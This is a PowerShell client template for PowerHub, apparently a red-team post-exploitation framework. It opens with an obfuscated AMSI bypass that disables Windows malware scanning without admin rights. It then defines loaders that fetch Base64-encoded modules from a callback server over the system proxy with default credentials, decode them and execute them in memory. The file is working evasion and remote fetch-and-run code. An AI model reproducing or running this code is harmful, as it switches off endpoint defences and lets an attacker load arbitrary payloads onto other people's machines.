$CALLBACK_URL = "{{callback_url}}"

Write-Host @"
PowerHub [ASCII art]
Run 'Help-PowerHub' for help
"@

Try {
    # Disables Win10 Defender, no admin required
    # Reqires some obfuscation
    $s = "{0}siI{1}tF{2}d" -f "am","ni","aile"
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField($s,'NonPublic,Static').SetValue($null,$true)
    Write-Host "[+] Disabled AMSI"
} Catch {
    Write-Host "[-] Failed to disable AMSI"
}



$Modules = @()
{% if modules %}
{% for m in modules %}
$m = new-object System.Collections.Hashtable
$m.add('name', '{{ m.name }}')
$m.add('type', '{{ m.type }}')
$m.add('code', '{{ m.code|safe }}')
$m.add('n', {{ m.n }})
$Modules += $m
{% endfor %}
{% endif %}


function Import-HubModule {

    Param(
        [parameter(Mandatory=$true)]
        $Module
    )

    $b64 = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Module["code"]))
    $sb = [Scriptblock]::Create($b64)
    New-Module -ScriptBlock $sb | Out-Null

    if ($?){
        Write-Host ("[*] {0} imported." -f $Module["name"])
    } else {
        Write-Host ("[*] Failed to import {0}" -f $Module["name"])
    }
}

ForEach ($m in $Modules) {
    if ($m["code"] -and $m["type"] -eq "ps1") {
        Import-HubModule $m
    }
}


function Convert-IntStringToArray ($s) {
    $no = $s.Split(",")
    $indices = @()
    foreach ($t in $no) {
        $limits = $t.Split("-")
        if ($limits.Length -eq 1) {
            $indices += $limits[0]
        } else {
            if (-not $limits[0]) { $limits[0] = 0}
            if (-not $limits[1]) { $limits[1] = $Modules.length-1}
            $indices += $limits[0] .. $limits[1]
        }
    }
    $indices
}

function List-HubModules {
<#
.SYNOPSIS

Lists all modules that are available via the hub. The property 'n' can be used
to activate and load the code of a module.

#>
    $(foreach ($ht in $Modules) {
        new-object PSObject -Property $ht
    } ) | Format-Table -AutoSize -Property n,type,name,code
}

function Load-HubModule {

<#
.SYNOPSIS

Transfers a module from the hub and imports it. It creates a web request to
load the Base64 encoded module code.

Author: Adrian Vollmer

.DESCRIPTION

Load-HubModule loads a module.

.PARAMETER s

Number of the module, separated by commas. Can contain ranges.

.EXAMPLE

Load-HubModule "3"

Description
-----------
Transfers the code of module #3 from the hub and imports it.

.EXAMPLE

Load-HubModule "1,4-6"

Description
-----------
Transfers the code of modules #1, #4, #5 and #6 from the hub and imports it.

.EXAMPLE

Load-HubModule "-"

Description
-----------
Transfers the code of all modules from the hub and imports it.

.NOTES

Use the '-Verbose' option to print detailed information.
#>

    Param(
        [parameter(Mandatory=$true)]
        [String]
        $s
    )

    $indices = Convert-IntStringToArray($s)

    $K=new-object net.webclient;
    $K.proxy=[Net.WebRequest]::GetSystemWebProxy();
    $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
    foreach ($i in $indices) {
        if ($i -lt $Modules.length -and $i -ge 0) {
            $Modules[$i]["code"] = $K.downloadstring(("{0}?m={1}" -f $CALLBACK_URL,$i));
            Import-HubModule $Modules[$i]
        }
    }
}


function Run-Exe {
    # TODO
}


function Help-PowerHub {
    Write-Host @"
The following functions are available:
  * List-HubModules
  * Load-HubModule
  * Run-Exe

Use 'Get-Help' to learn more about those functions.
"@
}
